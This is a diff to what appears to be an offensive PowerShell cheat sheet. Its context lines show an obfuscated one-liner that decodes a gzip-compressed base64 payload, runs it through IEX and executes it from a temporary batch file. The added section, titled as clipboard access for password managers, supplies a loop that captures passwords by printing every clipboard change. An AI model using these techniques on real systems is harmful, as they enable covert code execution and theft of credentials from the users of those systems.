@@ -29,6 +29,13 @@ cmd.exe /c powershell "'powershell ""$s=New-Object IO.MemoryStream(,[Convert]::F
 IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
 '""| out-file -filepath %tmp%\tmp9388.bat -encoding ascii; cmd /c '%tmp%\tmp9388.bat'
 ```
+## PowerShell Password Manager and Clipboard Access:
+
+Password managers offer many benefits for selection and storage of passwords.
+
+```
+PS C:\> $x=""; while($true) { $y=get-clipboard -raw; if ($x -ne $y) { Write-Host $y; $x=$y} }
+```
 
 # Living off the Land:
 
